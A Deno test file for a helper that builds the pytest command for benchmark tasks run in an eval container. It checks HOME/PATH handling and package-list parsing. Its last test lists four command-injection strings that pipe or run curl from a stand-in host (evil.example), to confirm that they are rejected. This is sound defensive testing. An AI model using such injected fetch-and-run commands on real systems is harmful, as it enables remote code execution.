/**
 * @module DeriveScopedTestCmdTest
 * @path tests/scripts/derive_scoped_test_cmd_test.ts
 * @description RED-first test, Phase 144 Step 5. `deriveScopedTestCmd`'s output is embedded
 *   as ONE shell-step args element in the persisted `external_bench_task` scenario YAML,
 *   which passes through the scenario framework's `expandInString` — a generic pass that
 *   substitutes any `$HOME`/`$PATH`-shaped token with the HOST's own environment value
 *   (`Deno.env.toObject()`), not the eval-jail container's runtime `HOME=/tmp`. A command
 *   referencing `$HOME` therefore reaches the container as a literal HOST path
 *   (`/home/<user>/.local/bin`), which does not exist inside the container — pytest's `uv`
 *   bootstrap then fails with "uv: command not found". Found via a real scenario-driven live
 *   run (the controls-sweep script bypasses expandInString entirely, so it never hit this).
 *   The derived command must hardcode the known container HOME (`/tmp`) instead.
 * @architectural-layer Test
 * @related-files [scripts/ingest_terminal_bench.ts, tests/scenario_framework/runner/synthetic_runner.ts]
 */

import { assert, assertEquals, assertThrows } from "@std/assert";
import { deriveScopedTestCmd } from "../../scripts/ingest_terminal_bench.ts";

Deno.test("[DeriveScopedTestCmd] never references $HOME or $PATH — the scenario framework's expandInString would substitute the HOST's value, not the container's", () => {
  const cmd = deriveScopedTestCmd("uv pip install pytest==8.4.1 pandas==2.2.0\n");
  assert(!cmd.includes("$HOME"), `must not reference $HOME (host-substituted before reaching the container): ${cmd}`);
  assert(!cmd.includes("$PATH"), `must not reference $PATH (host-substituted before reaching the container): ${cmd}`);
});

Deno.test("[DeriveScopedTestCmd] hardcodes the known eval-jail container HOME (/tmp) for the uv bin path", () => {
  const cmd = deriveScopedTestCmd("uv pip install pytest==8.4.1\n");
  assert(cmd.includes("/tmp/.local/bin"), `must hardcode /tmp/.local/bin, the real HOME=/tmp container path: ${cmd}`);
});

Deno.test("[DeriveScopedTestCmd] extracts the task-specific uv pip install package list", () => {
  const cmd = deriveScopedTestCmd("some setup\nuv pip install pytest==8.4.1 pandas==2.2.0\nmore setup\n");
  assert(cmd.includes("uv pip install -q pytest==8.4.1 pandas==2.2.0"), `must carry the exact package spec: ${cmd}`);
});

Deno.test("[DeriveScopedTestCmd] falls back to the default package spec when run-tests.sh names none", () => {
  const cmd = deriveScopedTestCmd("echo no install line here\n");
  assert(cmd.includes("uv pip install -q pytest==8.4.1"), `must fall back to the default package spec: ${cmd}`);
});

Deno.test("[DeriveScopedTestCmd] runs pytest against the hidden oracle-tests mount", () => {
  const cmd = deriveScopedTestCmd("uv pip install pytest==8.4.1\n");
  assertEquals(cmd.includes("pytest /oracle_tests/test_outputs.py -rA"), true);
});

Deno.test("[DeriveScopedTestCmd] a backslash-continued multi-line uv pip install block extracts the full package list, not just the first line", () => {
  const cmd = deriveScopedTestCmd(
    "uv pip install pytest==8.4.1 \\\n  pandas==2.2.0 \\\n  numpy==1.26.0\nmore setup\n",
  );
  assert(
    cmd.includes("uv pip install -q pytest==8.4.1 pandas==2.2.0 numpy==1.26.0"),
    `must capture the full continued package list, not truncate at the first physical line: ${cmd}`,
  );
});

Deno.test("[DeriveScopedTestCmd] rejects an install line containing shell metacharacters rather than silently interpolating it", () => {
  for (
    const malicious of [
      "pytest==8.4.1; curl https://evil.example/x | sh",
      "pytest==8.4.1 && curl https://evil.example/x",
      "pytest==8.4.1 `curl https://evil.example/x`",
      "pytest==8.4.1 $(curl https://evil.example/x)",
    ]
  ) {
    assertThrows(
      () => deriveScopedTestCmd(`uv pip install ${malicious}\n`),
      Error,
      "rejected upstream package spec",
    );
  }
});
